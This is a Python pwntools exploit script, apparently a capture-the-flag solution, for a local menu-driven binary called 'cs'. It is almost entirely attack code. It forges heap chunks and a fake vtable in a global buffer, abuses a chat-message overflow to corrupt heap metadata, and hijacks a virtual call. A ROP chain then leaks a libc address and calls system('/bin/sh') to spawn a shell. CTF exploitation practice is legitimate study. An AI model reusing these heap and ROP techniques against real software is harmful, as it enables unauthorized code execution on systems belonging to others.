from pwn import *

#context.log_level = 'debug'
#context.aslr      = False

io = process('./cs')

e = ELF('./cs')

libc = e.libc

def choose_side():
	io.recvuntil('command:')
	io.sendline('m')
	io.recvuntil(' 2.CT')
	io.sendline('1')

def choose_side2():
	io.recvuntil('command:')
	io.sendline('m')
	io.recvuntil('side?(y/n)')
	io.sendline('y')
	io.recvuntil(' 2.CT')
	io.sendline('1')

def public_chat(buf, size):
	io.recvuntil('command:')
	io.sendline('y')
	io.recvuntil('message?\n')
	io.sendline(str(size))
	io.recvuntil('To ALL:')
	io.sendline(buf)

def options(buf):
	io.recvuntil('command:')
	io.sendline('~')
	io.recvuntil('#')
	io.sendline('rename')
	io.sendline(buf)
	io.recvuntil('#')
	io.sendline('exit')


sleep(1)

io.recvuntil('name:')

'''
.bss:00000000006061F0 name            db 2A8h dup(?)          
.bss:0000000000606498 ; void *description
.bss:0000000000606498 description     dq ?                    
.bss:0000000000606498                                      
.bss:00000000006064A0 obj_vtable      dq ?        
.bss:00000000006064A0                             
'''
name_addr = 0x6061F0
overflow_func = 0x400E76

fake_chunk1 = name_addr
fake_vtable = name_addr + 0x100
bin_sh_addr = name_addr + 0x200
fake_chunk2 = name_addr + 0x280

name = p64(0) + p64(0x41)
name += p64(fake_chunk2) + p64(0)
name = name.ljust(0x100, 'A')

name += p64(overflow_func) * 4 
name = name.ljust(0x200, 'A')

name += '/bin/sh\x00'
name = name.ljust(0x280, 'A') 

name += p64(0) + p64(0x41)

io.sendline(name)
io.recvuntil('Description:\n')
io.sendline('BBBB')


choose_side() # 1
choose_side2() # 2 
choose_side2() # 3 
public_chat('AAAA', 0x40) # leave a chunk here. use this to overflow 4 
choose_side2() # 4 
choose_side2() # 5  delete 

payload = 'A'* 0x40
payload += p64(0) + p64(0x41) 
payload += p64(fake_chunk1)
public_chat(payload, 0x40)

choose_side2() 
choose_side2() # fake_chunk1

payload = p64(0) + p64(0x41)
payload += p64(fake_vtable)
options(payload) # modify vtable in object.



payload = 'A'*0x20
payload += p64(fake_vtable) 
public_chat(payload, 0x30) # malloc bss here.

#gdb.attach(io, 'b *0x040209B\n b*0x401CBE')

pop_rdi = 0x00000000004030e3 # pop rdi ; ret

payload = 'A' * 0x14
payload += p64(pop_rdi) + p64(0x0605F68) # put@got
payload += p64(0x0400CE8) # put@plt
payload += p64(overflow_func)
io.sendline(payload)

buf = io.recv() 
buf = io.recv(6)
buf = buf.ljust(8,'\x00')
puts_addr = u64(buf)
log.success('puts:%#x'%puts_addr)
libc.address = puts_addr - libc.symbols['puts']

payload = 'A'* 0x14
payload += p64(pop_rdi) + p64(bin_sh_addr)
payload += p64(libc.symbols['system'])

io.sendline(payload)
io.interactive()